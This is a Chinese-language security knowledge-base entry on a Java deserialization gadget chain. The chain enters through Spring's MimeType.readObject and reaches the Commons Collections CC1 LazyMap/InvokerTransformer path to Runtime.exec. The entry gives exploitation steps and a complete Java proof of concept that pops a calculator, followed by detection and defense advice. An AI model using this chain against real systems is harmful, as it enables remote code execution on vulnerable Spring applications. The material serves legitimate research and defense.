---
id: web-java-deser-spring-mimetype-readobject-lazymap-cc1
title: Spring MimeType 新反序列化入口类：readObject 调 getParameter → parameters.get 触发 LazyMap#get，接 CC1 链执行命令
type: scenario
domain: web
path: web/java/deserialization
technique: spring-mimetype-readobject-lazymap-gadget
tags:
- web
- java
- deserialization
- spring
- commons-collections
- cc1
- lazymap
- gadget
- codeql
- unsafe
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V452
  verified_at: '2026-11-10T02:02:29+08:00'
  notes: 已对照原文与 10 张截图核对：CodeQL 查询(MimeType readObject→getParameter→LazyMap.get 等 45 路径)、MimeType.readObject 源码 getParameter("charset")、getParameter 内 parameters.get、private final parameters、Unsafe 改字段后调试器显示 LazyMap@642、CC1 ChainedTransformer/InvokerTransformer 源码、计算器弹出与调用栈(readObject→getParameter→get→transform→transform)均有截图佐证；原文仅给验证环境(jdk17.0.11/SpringBoot3.1.10/CC3.2.1)未声明受影响版本，affected_versions 置空；CodeQL 方法论与 Unsafe 技巧与既有卡重复已按 skipped 处理；未被验证点：未在本机复跑
url: /docs/web/java/deserialization/web-java-deser-spring-mimetype-readobject-lazymap-cc1/
draft: false
kb_aliases:
- MimeType 反序列化
- Spring 新入口类
- MimeType readObject LazyMap
- CC1 新入口类
- Unsafe allocateInstance MimeType
- parameters 字段 LazyMap
---

# 一句话结论

Spring Framework 的 `org.springframework.util.MimeType` 是一个可序列化的反序列化入口类：其 `readObject` 在 `defaultReadObject()` 后调用 `this.getParameter("charset")`，而 `getParameter` 直接执行 `this.parameters.get(name)`；攻击者用 Unsafe 把 `MimeType` 的 `parameters` 字段替换为 CommonsCollections 的 `LazyMap`（装饰 `ChainedTransformer`），反序列化 `MimeType` 时即触发 `LazyMap#get → ChainedTransformer#transform → InvokerTransformer#transform → Runtime.exec`，在 JDK 17.0.11 + SpringBoot 3.1.10 + CC 3.2.1 环境验证可弹出计算器。

# 原理

- **入口在 `readObject`**：`MimeType.readObject(ObjectInputStream ois)` 的代码如下：
  ```java
  private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
      ois.defaultReadObject();
      String charsetName = this.getParameter("charset");
      if (charsetName != null) {
          this.resolvedCharset = Charset.forName(this.unquote(charsetName));
      }
  }
  ```
  `defaultReadObject()` 先从流中恢复字段（包括 `parameters`），随后 `getParameter("charset")` 被无条件调用。
- **`getParameter` 直接落到 Map.get**：`public String getParameter(String name) { return (String) this.parameters.get(name); }`，`parameters` 是 `private final Map<String, String> parameters`。只要该 Map 是一个在 `get` 时执行变换的实现（如 `LazyMap.decorate(map, chainedTransformer)`），对 `"charset"` 的这一次 `get` 就会驱动 transformer 链。
- **与 CC1 后半段拼接**：`LazyMap.get` 在键不存在时调用 `factory.transform(key)`，即 `ChainedTransformer.transform`；链上的 `ConstantTransformer(Runtime.class)` → `InvokerTransformer("getMethod", ...)` → `InvokerTransformer("invoke", ...)` → `InvokerTransformer("exec", ...)` 最终执行命令。整条链在反序列化 `MimeType` 的 `readObject` 内完成，不需要目标的业务逻辑配合。
- **为什么是新入口类**：经典 CC1 依赖 JDK 内部类 `AnnotationInvocationHandler` 和动态代理，常被 JEP 290 过滤器、RASP 与黑名单重点拦截；`MimeType` 是 Spring core 自带、大量 Spring 应用 classpath 中天然存在的应用依赖类，通常不在黑名单里，作为入口更隐蔽。
- **JDK 17 的构造难点**：`parameters` 是 `private final` 字段，JDK 17 强封装下直接反射 `setAccessible(true)` 会受模块访问限制。文章用 `sun.misc.Unsafe`：`allocateInstance(MimeType.class)` 绕过构造器拿到实例，`putObject(mimeType, objectFieldOffset(parameters), lazyMap)` 直接写字段；该技巧只作用于攻击者本地构造 payload 的阶段，受害者端无需 Unsafe。
- **CodeQL 的发现方式**：把 source 定义为“可序列化类中的 private void readObject”，sink 定义为 `org.apache.commons.collections.map.LazyMap#get`，即自动列出 `MimeType readObject → getParameter → get` 等路径；sink 设为 `transform` 时同样命中 `MimeType readObject → ChainedTransformer#transform`。

# 触发条件

- 目标存在反序列化入口（`ObjectInputStream.readObject` 处理攻击者可控数据）。
- classpath 同时存在 Spring Framework（`spring-core` 中的 `MimeType`）与 Commons Collections 3.x（`LazyMap`/`ChainedTransformer`/`InvokerTransformer`）。
- 反序列化流未被白名单/黑名单拦截；`MimeType` 不在常见黑名单，JEP 290 全局过滤器未开启或未覆盖 `org.springframework.util` 包。
- 攻击者构造端可用 Unsafe 或等价手段设置 final 字段（JDK 17 环境）。

# 利用步骤

1. 构造 CC1 后半段：`ConstantTransformer(Runtime.class)` → `InvokerTransformer("getMethod", {String,Class[]}, {"getRuntime",null})` → `InvokerTransformer("invoke", {Object,Object[]}, {null,null})` → `InvokerTransformer("exec", {String}, {"open -a Calculator"})`，装入 `ChainedTransformer`。
2. `LazyMap.decorate(new HashMap(), chainedTransformer)` 得到会在 `get` 时触发链的 Map。
3. `Unsafe.allocateInstance(MimeType.class)` 得到空实例，用 `objectFieldOffset` + `putObject` 把 `parameters` 字段指向 LazyMap。
4. 将 `MimeType` 实例序列化（文章封装为 Base64 字符串）后交给目标 `ObjectInputStream` 反序列化。
5. 验证调用栈：`MimeType.readObject` → `MimeType.getParameter` → `LazyMap.get` → `ChainedTransformer.transform` → `InvokerTransformer.transform` → `Runtime.exec`；本地复现可见计算器弹出、进程退出。

# PoC

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.springframework.util.MimeType;
import sun.misc.Unsafe;
import java.lang.reflect.Field;
import java.util.*;

public class Test {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
                                   new Object[]{"getRuntime", null}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
                                   new Object[]{null, null}),
            new InvokerTransformer("exec", new Class[]{String.class},
                                   new Object[]{"open -a Calculator"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map map1 = LazyMap.decorate(new HashMap(), chainedTransformer);

        Field field = Unsafe.class.getDeclaredField("theUnsafe");
        field.setAccessible(true);
        Unsafe unsafe = (Unsafe) field.get(null);
        MimeType mimeType = (MimeType) unsafe.allocateInstance(MimeType.class);
        unsafe.putObject(mimeType,
            unsafe.objectFieldOffset(MimeType.class.getDeclaredField("parameters")), map1);

        // SerializeUtils 为简单的序列化/反序列化封装（serializeBase64 输出 Base64，unserializeBase64 还原）
        String pld = SerializeUtils.serializeBase64(mimeType);
        SerializeUtils.unserializeBase64(pld); // 触发
    }
}
```

# 变体与关联

- **同一入口的其他路径**：CodeQL 结果显示 `MimeType.readObject → getParameter → DefaultedMap.get → LazyMap.get`、`→ Flat3Map.get → equals → FastHashMap.get → LazyMap.get`、`→ SingletonMap.isEqualKey → equals → FastTreeMap.get → LazyMap.get` 等多条路径，说明 `parameters` 可换成多层 Map 组合，适配不同可用链。
- **sink 前移**：把 sink 定为 `transform` 可直接命中 `MimeType.readObject → ChainedTransformer.transform`，跳过 Map 层。
- **同类入口对比**：经典 CC1 用 `AnnotationInvocationHandler`（JDK 内部类）触发 LazyMap/TransformedMap，见 [[web-java-deser-commonscollections-cc1-lazymap-proxy]]、[[web-java-deser-commonscollections-cc1-transformedmap]]；CC6/CC5/CC7 等 Map/toString 触发链见 [[web-java-deser-commonscollections-cc6-hashmap-hashset-invokertransformer]]、[[web-java-deser-commonscollections-cc5-badattribute-tostring]]、[[web-java-deser-commonscollections-cc7-hashtable-equals-lazymap]]。
- **Spring 其他 gadget**：[[web-java-deser-spring-aop-jdk17-templatesimpl-chain]]、[[web-java-deserialization-blacklist-hotswappable-xstring-pojonode-spring-aop]]。
- **发现方法**：用 CodeQL 定义 readObject source 与危险 sink 正向枚举，参见 [[code-analysis-vuln-discovery-codeql-java-gadget-chain-mining]]。
- JDK 17 下 Unsafe 改字段/模块绕过参见 [[web-java-classloader-jdk17-class-module-field-spoof]]、[[web-java-deserialization-payload-length-compression]]。

# 检测与防御

- **根治**：不反序列化不可信数据；确需反序列化时启用 JEP 290 `ObjectInputFilter`，采用白名单并覆盖 `org.springframework.util.*` 等应用依赖类，而不是只封禁 JDK 内部类。
- **依赖治理**：移除或升级 Commons Collections 3.x（`InvokerTransformer` 在 3.2.2 起需要显式开启序列化；4.x 与 3.x 混用同样危险），非必要不引入。
- **检测**：序列化流/反序列化日志中出现 `org.springframework.util.MimeType`、`LazyMap`、`ChainedTransformer`、`InvokerTransformer` 等类名组合；反序列化接口出现异常后紧接进程创建；RASP 监控 `readObject` 内对 `Map.get` 的动态调用链。
- 黑名单思路只能提高成本：新的“可序列化入口类 + Map.get/toString/hashCode”组合会不断出现，应以全局类型白名单与数据来源隔离为主。
